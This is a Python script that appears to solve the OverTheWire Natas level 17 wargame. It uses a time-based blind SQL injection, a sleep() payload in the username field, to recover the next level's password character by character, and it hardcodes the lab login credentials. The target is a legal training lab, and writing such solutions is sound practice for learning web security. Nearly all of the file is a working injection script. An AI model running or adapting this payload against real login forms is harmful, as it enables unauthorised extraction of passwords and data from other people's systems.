#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import requests

def is_true(s):
    url = "http://natas17.natas.labs.overthewire.org"
    # La cabecera de autorización la he capturado con TamperData, pero es trivial calcularla:
    # Es la cadena "username:password" en base64
    # headers = {"Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="}
    if step == 1:
        payload = {'username': 'natas18" and if(password like binary "%' + s + '%", sleep(3), null) #'}
    else:
        payload = {'username': 'natas18" and if(password like binary "' + s + '%", sleep(3), null) #'}
    try:
        r = requests.post(url, data=payload, auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'), timeout=2.500)
    except: # requests.exceptions.Timeout
        return True

# 1st pass
print "*** 1st pass ***"
step = 1
chars = ""
for i in map(chr, range(65, 91) + range(97,123) + range(48, 58)):
  if is_true(i):
    print "Found char:", i
    chars = chars + i
print "Got char list:", chars

print "*** 2nd pass ***"
step = 2
i=1
passwd = ""
while len(passwd) < 32:
    for c in chars:
        if is_true(passwd + c):
            print "Found string:", passwd + c
            passwd = passwd + c
print passwd
